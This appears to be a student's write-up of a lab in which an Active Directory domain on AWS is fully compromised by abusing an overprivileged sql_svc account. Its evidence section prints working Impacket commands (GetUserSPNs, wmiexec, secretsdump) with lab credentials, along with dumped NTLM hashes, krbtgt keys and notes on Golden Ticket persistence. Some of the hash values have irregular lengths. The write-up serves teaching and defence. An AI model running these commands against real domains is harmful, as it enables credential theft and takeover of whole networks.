# 🚨 Active Directory Domain Compromise Lab (AWS)

## 📌 Overview

This project demonstrates a full Active Directory domain compromise conducted in a controlled AWS-based lab environment.

Starting from a low-privileged domain user, I performed enumeration, credential discovery, lateral movement, and privilege escalation, ultimately achieving Domain Administrator-level access and full domain compromise.

This lab simulates real-world enterprise attack paths used in internal penetration tests and red team engagements.

⚠️ For educational and ethical use only.

---

## 🧱 Lab Environment

* **Attacker:** Kali Linux
* **Target 1:** Windows 10 (Domain User)
* **Target 2:** Windows Server 2022 (Domain Controller)
* **Domain:** corp.local
* **Cloud Platform:** AWS EC2

---

## 🧭 Attack Chain (MOST IMPORTANT SECTION)

This is the flow of compromise:

1. Network & service enumeration
2. SMB / domain user discovery
3. Identification of privileged service account (sql_svc)
4. Credential access and authentication
5. Lateral movement using Impacket tools
6. Remote command execution (psexec / wmiexec)
7. Privilege escalation to SYSTEM
8. Domain credential extraction (secretsdump)
9. Full Active Directory compromise

---

## 🔍 Phase 1: Enumeration

Initial reconnaissance was performed to identify:

* Active hosts in the domain
* SMB services and shares
* Valid domain user accounts
* Potential attack paths (SPNs / service accounts)

This phase revealed a high-value service account: **sql_svc**

---

## 🔐 Phase 2: Credential Discovery

The sql_svc account was identified as a critical target due to:

* Service Principal Name (SPN) registration
* Membership in privileged groups
* Exposure via misconfigured Active Directory permissions

This account became the primary entry point for exploitation.

---

## 🔁 Phase 3: Lateral Movement

Using Impacket tools:

* psexec.py
* wmiexec.py

I successfully executed remote commands on domain-joined systems, gaining interactive access to the environment.

---

## ⬆️ Phase 4: Privilege Escalation

Through credential reuse and misconfiguration, I escalated privileges to:

* NT AUTHORITY\SYSTEM
* Domain-level administrative access

This granted full control over the target system.

---

## 🧠 Phase 5: Credential Dumping

Using secretsdump.py, I extracted:

* Local SAM hashes
* Domain user NTLM hashes
* Kerberos keys
* krbtgt account hash (critical for domain persistence)

---

## 💥 Final Result: Full Domain Compromise

This attack resulted in:

* Complete Domain Administrator access
* Extraction of all domain credentials
* Compromise of Kerberos authentication trust (krbtgt)
* Ability to perform Pass-the-Hash and Golden Ticket attacks
* Full control over the Active Directory environment

---

## 🚨 Security Impact

This lab demonstrates how:

* A single misconfigured service account can lead to total domain compromise
* Excessive privileges in service accounts create critical attack paths
* Lack of monitoring enables lateral movement and escalation
* Active Directory environments require strict privilege separation

---

## 🛡️ Defensive Recommendations

* Enforce least privilege for service accounts
* Remove unnecessary Domain Admin group memberships
* Monitor Kerberos and authentication anomalies
* Use LAPS for local admin password management
* Implement EDR + SIEM monitoring for lateral movement detection

---

## 🛠 Tools Used

* Kali Linux
* Nmap
* enum4linux
* Impacket (psexec, wmiexec, secretsdump)

---

## 📸 Evidence

### Screenshot 1: Initial Access & Domain Admins Group Membership
**Caption: Domain user with Domain Admins group membership confirmed**

```
C:\>whoami
corp\sql_svc

C:\>whoami /groups
CORP\Domain Admins                   Group         S-1-21-638...        Mandatory group, Enabled
```

**Key Finding:** sql_svc confirmed as member of Domain Admins - critical vulnerability identified.

---

### Screenshot 2: Kerberos Ticket Obtained
**Caption: Valid Kerberos ticket for krbtgt service principal acquired**

```
$ klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jsmith@CORP.LOCAL

Valid starting       Expires              Service principal
06/28/26 12:58:59   06/28/26 22:58:59    krbtgt/CORP.LOCAL@CORP.LOCAL
```

**Impact:** Valid Kerberos authentication established. Attacker can now interact with domain services.

---

### Screenshot 3: SPN Enumeration Revealing sql_svc
**Caption: SPN enumeration revealing sql_svc service account in Domain Admins**

```
(kali@kali)~$ impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 172.31.34.227

ServicePrincipalName                 Name       MemberOf
===================================================================
MSSQLSvc/sqlserver.corp.local:1433   sql_svc    CN=Domain Admins,CN=Users,DC=corp,DC=local
```

**Critical Vulnerability:** Service account sql_svc identified with excessive privileges (Domain Admins membership). Direct path to full domain compromise.

---

### Screenshot 4: Remote Command Execution via WMIExec
**Caption: Remote command execution via wmiexec with sql_svc credentials**

```
(kali@kali)~$ impacket-wmiexec 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell – Careful what you execute

C:\>whoami
corp\sql_svc
```

**Result:** Semi-interactive shell established with Domain Admins privileges. Full lateral movement capability achieved.

---

### Screenshot 5: Domain Admins Group Verification
**Caption: Domain Admins group members including sql_svc verified**

```
C:\>net group "Domain Admins" /domain
Group name        Domain Admins
Comment           Designated administrators of the domain

Members
Administrator     Jadmin         sql_svc

The command completed successfully.
```

**Security Issue:** Confirms service account (sql_svc) membership in Domain Admins. Overprivilege condition verified.

---

### Screenshot 6: Credential Extraction Initiated
**Caption: Secretsdump extracting NTLM hashes from Domain Controller**

```
(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0

[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

**Result:** Credential extraction in progress. All domain hashes now accessible.

---

### Screenshot 7: krbtgt Hash Compromise
**Caption: krbtgt hash compromise - Kerberos master key obtained**

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
```

**CRITICAL FINDING:** krbtgt hash (Kerberos master key) extracted. This enables:
- Golden Ticket creation
- 10-year ticket validity
- Complete domain persistence
- Bypass of all authentication

---

### Screenshot 8: All Domain User Credentials Extracted
**Caption: Complete domain credential dump - all users and machine accounts compromised**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::

[*] Kerberos keys grabbed
[*] Cleaning up...
```

**Result:** All domain user credentials compromised - jsmith, Jadmin, sql_svc, and machine accounts.

---

### Screenshot 9: Complete Domain Compromise Achieved
**Caption: Complete secretsdump extraction showing full domain compromise with all encryption keys**

```
[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes
[*] Dumping cached domain logon information
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] NL$KM
[*] Dumping Domain Credentials

Administrator:aes256-cts-hmac-sha1-96:7be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94

[*] Kerberos keys grabbed
[*] Cleaning up...
```

**COMPLETE DOMAIN COMPROMISE ACHIEVED:**
- ✅ All user hashes extracted (Administrator, jsmith, Jadmin, sql_svc)
- ✅ All machine account hashes extracted
- ✅ krbtgt hash obtained (10-year Golden Ticket capability)
- ✅ All Kerberos keys extracted (AES-256, AES-128, DES-CBC-MD5)
- ✅ DPAPI keys compromised
- ✅ Full persistent access achieved

---

## 💥 Executive Impact Summary

This single misconfiguration (overprivileged service account) resulted in:

* **Full Active Directory domain compromise** - Complete control over all domain resources
* **Extraction of all user credentials** - Every domain user password hash obtained
* **Compromise of Kerberos authentication system (krbtgt)** - Master key extracted
* **Ability to forge authentication tickets (Golden Tickets)** - Create valid tickets for any user, any time
* **Persistent, undetectable domain-level access** - 10-year ticket validity with no password required

**Key Insight:** This demonstrates how a single compromised service account can lead to enterprise-wide takeover. The attack required no zero-days, no exploits—only misconfigurations that exist in real organizations today.

---

## 🎯 Key Takeaways

* Active Directory misconfigurations are high-impact attack vectors
* Service accounts are frequently overlooked but highly valuable
* Lateral movement is often easier than initial access
* Proper segmentation and least privilege could have prevented full compromise

---

## 👤 Author

**Rubin Perez**
Cybersecurity Student | Aspiring Ethical Hacker

---
